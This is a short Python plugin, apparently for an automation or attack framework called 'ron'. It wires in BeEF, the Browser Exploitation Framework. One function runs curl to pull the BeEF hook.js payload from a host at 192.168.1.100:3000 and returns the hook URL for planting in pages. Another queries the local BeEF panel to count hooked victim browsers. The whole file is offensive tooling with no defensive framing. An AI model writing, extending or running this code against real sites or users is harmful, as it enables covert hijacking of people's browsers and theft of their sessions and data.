def register(ron):
    def hook_beef(ip="192.168.1.100", port=3000):
        cmd = f"curl http://{ip}:{port}/hook.js > /tmp/beef_hook.html"
        ron.execute_task(cmd)
        ron.log("🔗 BeEF hook: /tmp/beef_hook.html")
        return f"http://{ip}:{port}/hook.js"
    
    def check_beef():
        hooked = ron.execute_task("curl http://127.0.0.1:3000/ui/panel")
        ron.log(f"🐮 BeEF: {len(hooked)} browsers")
    
    return {"beef_hook": hook_beef, "beef_status": check_beef}
